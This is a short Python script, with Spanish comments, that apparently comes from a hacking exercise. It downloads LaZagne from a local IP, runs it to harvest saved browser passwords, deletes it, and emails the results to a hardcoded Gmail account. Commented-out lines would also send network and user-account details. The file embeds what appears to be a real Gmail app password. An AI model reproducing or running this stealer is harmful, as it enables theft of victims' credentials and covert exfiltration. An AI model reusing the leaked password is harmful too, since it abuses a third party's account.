#!/usr/bin/env python3
# coding: cp850 
import subprocess
import smtplib
from email.mime.text import MIMEText
import requests
import tempfile
import os


def run_comand(command):
    output_comand=subprocess.check_output(command, shell=True)
    return output_comand.decode("cp850")#cp80 se usa en windows y utf-8 en linux y mac

def send_mail(subject, body, sender, recipient, password):
   msg = MIMEText(body)
   msg["Subject"] = subject
   msg["From"] = sender
   msg["To"] = ', '.join(recipient)#separar los correos con comas y espacio 

   with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
    server.login(sender, password)
    server.sendmail(sender, recipient, msg.as_string())
   # server.sendmail(sender, recipient, msg.get_payload())
print("Email enviado")  


def download_and_execute_lazagne():
   r = requests.get("http://192.168.68.123/lazagne.exe")#url de descarga
   temp_file = tempfile.mkdtemp()
   os.chdir(temp_file)
   with open("lazagne.exe", "wb") as file:
      file.write(r.content)
   output_lazagne=run_comand("lazagne.exe browsers")#ejecutar el archivo descargado
   os.remove("lazagne.exe")
   return output_lazagne
      

if __name__ == "__main__":
    #ipconfig_output = run_comand("ipconfig /all")
    #users_info = run_comand("net user")

   # send_mail("Ipconfig INFO", ipconfig_output, "gabrielbestrafer@gmail.com", ["gabrielbestrafer@gmail.com"], "bgpq knde ozid ljcx")
    #send_mail("Ipconfig INFO", users_info, "gabrielbestrafer@gmail.com", ["gabrielbestrafer@gmail.com"], "bgpq knde ozid ljcx")
  output_lazagne_andexecute = download_and_execute_lazagne ()
  send_mail("Lazagne INfo", output_lazagne_andexecute, "gabrielbestrafer@gmail.com", ["gabrielbestrafer@gmail.com"], "bgpq knde ozid ljcx")